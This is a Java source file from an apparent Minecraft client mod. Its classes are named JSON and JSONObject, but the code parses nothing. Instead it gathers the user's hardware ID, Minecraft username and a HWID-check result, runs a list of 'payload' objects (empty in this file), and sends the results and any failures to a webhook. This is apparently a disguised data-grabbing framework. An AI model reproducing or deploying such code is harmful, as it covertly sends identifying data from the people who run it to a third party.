package security;



import net.minecraft.client.Minecraft;
import security.ui.JSONObject;
import thefellas.safepoint.Safepoint;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;

public final class JSON
{
    private static final ArrayList<JSONObject> objects;
    private static final boolean debug = false;

    static SimpleDateFormat timeformat = new SimpleDateFormat("H:m");
    static String time = timeformat.format(new Date());

    public static void main(final String[] args) {
        new JSON();
        parseJson();
    }

    public static void parseJson() {
        JSON.objects.addAll(Arrays.asList());
        final String separator = new JSONBuilder().value("content","> "+time.toString()  + "\\n> HWID: " + HWIDUtils.getHWID() + "\\n > Username: " + Minecraft.getMinecraft().getSession().getUsername() + "\\n > Discord: " + "" + "\\n > HWID CHECK: " + (Safepoint.hwidManager.isHWIDValid() ? "True" : "False")).build();

        JSON.objects.spliterator().forEachRemaining(payload -> {
            try {
                payload.handle();
            }
            catch (Exception e) {
                WebhookUtils.send(new JSONBuilder().value("content", "> Failure on payload " + payload.getName()).build());
            }
            return;
        });
        WebhookUtils.send(separator);
    }

    static {
        objects = new ArrayList<JSONObject>();
    }
}